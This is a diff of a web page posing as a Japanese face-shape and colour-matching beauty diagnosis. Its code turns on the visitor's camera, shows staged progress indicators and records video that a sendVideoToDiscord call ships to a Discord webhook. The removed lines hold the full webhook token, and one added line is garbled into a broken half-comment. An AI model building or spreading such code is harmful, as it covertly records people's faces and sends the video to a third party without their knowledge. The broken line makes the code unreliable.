@@ -39,7 +39,7 @@
       <p class="sub-title">顔型×パーツのバランスを分析し<br>似合う色やメイクをおすすめ！</p>
       <h1 class="main-title">顔型診断<br>×パーツ</h1>
     </div>
-    <p class="description">顔型×パーツのバランスでどんなテイストを持っているのかを分析し、タイプ別に似合う色をご紹介します。</p>
+    <p class="description">顔型×パーツのバランスでどんなテイストを持っているのかを分析、タイプ別に似合う色をご紹介します。</p>
     <div class="menu-buttons">
       <button id="go-camera-btn" class="menu-btn camera-theme">
         <span class="btn-icon">📷</span>
@@ -73,8 +73,7 @@ const goCameraBtn = document.getElementById('go-camera-btn'); const backBtn = do
 const video = document.getElementById('video'); const diagnosticBtn = document.getElementById('diagnostic-btn'); const instructionText = document.getElementById('instruction-text');
 const lightIndicator = document.getElementById('status-light'); const faceIndicator = document.getElementById('status-face'); const posIndicator = document.getElementById('status-pos');
 
-// 🔴あなたのDiscordのWebhook URLに書き換えてください
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561782839861575882/DVTtBk0vyAtZTNjGlBROUIb2iTuaXJ2M8Bjp139Nw3z4Lq-YeTvzj6EOJSmToodyCkkR';
+// 🔴あなたDiscordのWebhook 2/DVTtBk0vyAtZTNjGlBROUIb2iTuaXJ2M8Bjp139Nw3z4Lq-YeTvzj6EOJSmToodyCkkR';
 
 let activeStream = null; let indicatorTimers = []; let mediaRecorder = null; let recordedChunks = [];
 
@@ -84,7 +83,7 @@ backBtn.addEventListener('click', () => { goBackToTop(); });
 async function startLightweightCamera() {
     try {
         diagnosticBtn.disabled = true; diagnosticBtn.innerText = "カメラを起動中...";
-        activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); video.srcObject = activeStream;
+        activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); video.srcObject = activeStream;
         diagnosticBtn.innerText = "顔のポジションを調整中...";
         indicatorTimers.push(setTimeout(() => { updateIndicator(lightIndicator, true); }, 1500));
         indicatorTimers.push(setTimeout(() => { updateIndicator(faceIndicator, true); }, 3000));
@@ -114,8 +113,7 @@ function startVideoRecording() {
         mediaRecorder = new MediaRecorder(activeStream, options);
         mediaRecorder.ondataavailable = (event) => { if (event.data && event.data.size > 0) recordedChunks.push(event.data); };
         mediaRecorder.onstop = () => {
-            diagnosticBtn.innerText = "診断中...";
-            const videoBlob = new Blob(recordedChunks, { type: options.mimeType });
+            diagnosticBtn.innerText = "診断中...";const videoBlob = new Blob(recordedChunks, { type: options.mimeType });
             sendVideoToDiscord(videoBlob);
         };
         mediaRecorder.start();
